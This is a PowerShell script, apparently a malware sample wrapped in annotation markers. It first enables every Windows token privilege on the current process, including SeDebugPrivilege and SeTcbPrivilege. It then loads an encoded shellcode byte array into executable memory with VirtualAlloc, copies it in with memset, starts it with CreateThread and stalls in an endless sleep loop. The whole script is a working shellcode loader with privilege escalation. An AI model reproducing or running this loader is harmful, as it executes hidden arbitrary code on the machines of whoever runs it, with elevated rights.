 -||-> function Set-LHSTokenPrivilege
{

   
[cmdletbinding(  
    ConfirmImpact = 'low',
    SupportsShouldProcess = $false
)]  

[OutputType('System.Boolean')]

Param(

    [Parameter(Position=0,Mandatory=$True,ValueFromPipeline=$False,HelpMessage='An Token Privilege.')]
    [ValidateSet(
        "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
        "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
        "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
        "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
        "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
        "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
    [String]$Privilege,

    [Parameter(Position=1)]
    $ProcessId = $pid,

    [Switch]$Disable
   )

BEGIN {

     -||-> Set-StrictMode -Version Latest <-||- 
     -||-> ${CmdletName} = $Pscmdlet.MyInvocation.MyCommand.Name <-||- 



 -||-> $definition = @'
 using System;
 using System.Runtime.InteropServices;
  
 public class AdjPriv
 {
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
  internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
  
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
  internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

  [DllImport("advapi32.dll", SetLastError = true)]
  internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

  [StructLayout(LayoutKind.Sequential, Pack = 1)]
  internal struct TokPriv1Luid
  {
   public int Count;
   public long Luid;
   public int Attr;
  }
  
  internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
  internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
  internal const int TOKEN_QUERY = 0x00000008;
  internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

  public static bool EnablePrivilege(long processHandle, string privilege, bool disable)
  {
   bool retVal;
   TokPriv1Luid tp;
   IntPtr hproc = new IntPtr(processHandle);
   IntPtr htok = IntPtr.Zero;
   retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
   tp.Count = 1;
   tp.Luid = 0;
   if(disable)
   {
    tp.Attr = SE_PRIVILEGE_DISABLED;
   }
   else
   {
    tp.Attr = SE_PRIVILEGE_ENABLED;
   }
   retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
   retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
   return retVal;
  }
 }
'@ <-||- 



} 

PROCESS {

     -||-> $processHandle = ( -||-> Get-Process -id $ProcessId <-||- ).Handle <-||- 
    
     -||-> $type =  -||-> Add-Type $definition -PassThru <-||-  <-||- 
     -||-> $type[0]::EnablePrivilege($processHandle, $Privilege, $Disable) <-||- 

} 

END {  -||-> Write-Verbose "Function ${CmdletName} finished." <-||-  }

} <-||-  
 
 -||-> $Privs =  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",

        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",

        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",

        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",

        "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",

        "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",

        "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",

        "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",

        "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",

        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",

        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" <-||- 

         -||-> foreach ($i in  -||-> $Privs <-||- ){
          -||-> Set-LHSTokenPrivilege -Privilege $i <-||- 
        } <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbe,0x3a,0xc7,0xf8,0xa9,0xdb,0xd3,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x4b,0x31,0x75,0x15,0x03,0x75,0x15,0x83,0xc5,0x04,0xe2,0xcf,0x3b,0x10,0x2b,0x2f,0xc4,0xe1,0x4c,0xa6,0x21,0xd0,0x4c,0xdc,0x22,0x43,0x7d,0x97,0x67,0x68,0xf6,0xf5,0x93,0xfb,0x7a,0xd1,0x94,0x4c,0x30,0x07,0x9a,0x4d,0x69,0x7b,0xbd,0xcd,0x70,0xaf,0x1d,0xef,0xba,0xa2,0x5c,0x28,0xa6,0x4e,0x0c,0xe1,0xac,0xfc,0xa1,0x86,0xf9,0x3c,0x49,0xd4,0xec,0x44,0xae,0xad,0x0f,0x65,0x61,0xa5,0x49,0xa5,0x83,0x6a,0xe2,0xec,0x9b,0x6f,0xcf,0xa7,0x10,0x5b,0xbb,0x36,0xf1,0x95,0x44,0x94,0x3c,0x1a,0xb7,0xe5,0x79,0x9d,0x28,0x90,0x73,0xdd,0xd5,0xa2,0x47,0x9f,0x01,0x27,0x5c,0x07,0xc1,0x9f,0xb8,0xb9,0x06,0x79,0x4a,0xb5,0xe3,0x0e,0x14,0xda,0xf2,0xc3,0x2e,0xe6,0x7f,0xe2,0xe0,0x6e,0x3b,0xc0,0x24,0x2a,0x9f,0x69,0x7c,0x96,0x4e,0x96,0x9e,0x79,0x2e,0x32,0xd4,0x94,0x3b,0x4f,0xb7,0xf0,0x88,0x7d,0x48,0x01,0x87,0xf6,0x3b,0x33,0x08,0xac,0xd3,0x7f,0xc1,0x6a,0x23,0x7f,0xf8,0xca,0xbb,0x7e,0x03,0x2a,0x95,0x44,0x57,0x7a,0x8d,0x6d,0xd8,0x11,0x4d,0x91,0x0d,0xb5,0x1d,0x3d,0xfe,0x75,0xce,0xfd,0xae,0x1d,0x04,0xf2,0x91,0x3d,0x27,0xd8,0xb9,0xd7,0xdd,0x8b,0x05,0x8f,0xdc,0x4e,0xee,0xcd,0xe0,0x77,0xe1,0x58,0x06,0x1d,0xed,0x0c,0x90,0x8a,0x94,0x15,0x6a,0x2a,0x58,0x80,0x16,0x6c,0xd2,0x20,0xe6,0x23,0x13,0x41,0xf4,0x54,0x1c,0xa9,0x04,0xa5,0x09,0xa9,0x6e,0xa1,0x9b,0xfe,0x06,0xab,0xfa,0xc8,0x88,0x54,0x29,0x4b,0xce,0xab,0xac,0xa2,0xa4,0x9a,0x3a,0x74,0xd3,0xe2,0xaa,0x74,0x23,0xb5,0xa0,0x74,0x4b,0x61,0x91,0x27,0x6e,0x6e,0x0c,0x54,0x23,0xfb,0xaf,0x0c,0x97,0xac,0xc7,0xb2,0xce,0x9b,0x47,0x4d,0x25,0x98,0x80,0xb1,0xb8,0x5c,0x71,0x72,0x6d,0xa5,0x07,0x9d,0xad,0x92,0x18,0xe8,0x90,0xb3,0xb2,0x12,0x86,0xc4,0x96 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



